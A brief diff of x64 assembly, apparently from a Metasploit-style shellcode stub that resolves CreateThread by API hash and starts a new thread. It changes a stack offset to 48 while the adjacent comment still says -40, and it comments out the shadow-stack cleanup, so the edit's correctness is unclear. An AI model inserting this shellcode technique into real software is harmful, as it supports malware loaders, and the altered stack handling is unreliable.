@@ -39,8 +39,8 @@ start:
 
   mov r11d, 0x221b4546                        ; hash( "kernel32.dll", "CreateThread" )
   call block_api_direct                       ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
-  add rsp, 40                                 ; RSP will be off by -40 after each call to block_api
+  add rsp, 48                                 ; RSP will be off by -40 after each call to block_api
   ret
 
 threadstart:
-  add rsp, 0x20                               ; remove shadow stack
+  ; ret
